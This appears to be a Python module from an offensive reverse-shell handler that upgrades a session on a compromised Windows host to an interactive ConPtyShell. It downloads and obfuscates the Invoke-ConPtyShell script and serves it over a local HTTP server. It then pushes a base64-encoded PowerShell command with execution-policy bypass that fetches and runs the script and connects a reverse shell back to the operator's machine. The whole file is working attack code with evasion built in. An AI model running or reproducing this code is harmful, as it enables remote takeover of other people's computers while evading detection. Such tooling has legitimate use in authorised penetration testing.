from __future__ import annotations

import base64
import shutil
import threading
import time
import urllib.request
from typing import Callable, Dict, Optional

from koi.session import Session
from koi.utils.cache import put_cache, get_cache, cache_path
from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
from koi.utils.tcp import spawn_http_server
from koi.utils.ui import Spinner, notify, _b, _p

_CONPTYSHELL_URL = (
    "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
    "/master/Invoke-ConPtyShell.ps1"
)


def _build_invoke_cmd(
    local_ip: str, http_port: int, port: int, rows: int, cols: int, conpty_fn: str
) -> str:
    iex = _obfuscate_call("Invoke-Expression")
    iwr = _obfuscate_call("Invoke-WebRequest")
    inner = (
        f"{iex}({iwr} 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {port}"
        f" -Rows {rows} -Cols {cols} -CommandLine powershell"
    )
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -nop -ep bypass -enc {encoded}"


_CONPTY_CACHE_NAME = "Invoke-ConPtyShell.ps1"


def _fetch_conptyshell() -> tuple[bytes, str]:
    try:
        with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=15) as resp:
            ps1_data = resp.read()
        put_cache(_CONPTY_CACHE_NAME, ps1_data)
        return ps1_data, "remote"
    except Exception as exc:
        cached = get_cache(_CONPTY_CACHE_NAME)
        if cached is not None:
            return cached, "cache"
        raise exc


def upgrade_windows_conptyshell(
    sess: Session,
    sessions: Dict[int, Session],
    port: int,
    pending_conpty: dict,
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    mask_ip: Callable[[str, str], str],
    logger=None,
) -> None:
    try:
        cols, rows = shutil.get_terminal_size()
    except Exception:
        cols, rows = 80, 24

    local_ip = sess.conn.getsockname()[0]
    if local_ip in ("0.0.0.0", ""):
        local_ip = "127.0.0.1"

    with Spinner("Fetching ConPtyShell..."):
        try:
            ps1_data, source = _fetch_conptyshell()
        except Exception as exc:
            notify('error', f"Failed to fetch ConPtyShell: {exc}")
            return

    if source == "cache":
        notify('warning', f"Network unavailable, using cached ConPtyShell ({cache_path(_CONPTY_CACHE_NAME)})")
    else:
        notify('info', "ConPtyShell fetched from remote")

    ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
    http_port, _ = spawn_http_server(ps1_data, timeout=60.0)
    notify('info', f"Serving ConPtyShell on port {_b(http_port)}")

    invoke_cmd = _build_invoke_cmd(local_ip, http_port, port, rows, cols, conpty_fn)

    notify('info',
        f"Invoking ConPtyShell on session {_p(f'#{sess.id}')}, callback {_b(mask_ip(local_ip, 'local'))}:{_b(port)}"
    )

    if logger:
        logger.log_event("upgrade_start")

    pending_conpty[sess.addr[0]] = sess.os_type
    sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace"))

    with Spinner("Waiting for ConPtyShell connection..."):
        new_sess = _wait_for_new_session(
            conpty_staging=conpty_staging,
            conpty_lock=conpty_lock,
            expected_ip=sess.addr[0],
            timeout=30.0,
        )

    if new_sess is None:
        notify('error', "ConPtyShell did not connect back in time.")
        return

    old_id = sess.id
    sess.close()
    sessions.pop(old_id, None)
    new_sess.id = old_id
    sessions[old_id] = new_sess

    new_sess.upgraded = True
    new_sess.is_conptyshell = True
    if logger:
        logger.log_event("upgrade_done")
        new_sess.attach_logger(logger)
    time.sleep(0.3)
    new_sess.conn.sendall(b"\r\n")
    notify('success', f"Session {_p(f'#{old_id}')} upgraded to ConPtyShell.")


def _wait_for_new_session(
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    expected_ip: str,
    timeout: float = 30.0,
) -> Optional[Session]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        time.sleep(0.1)
        with conpty_lock:
            if expected_ip in conpty_staging:
                return conpty_staging.pop(expected_ip)
    return None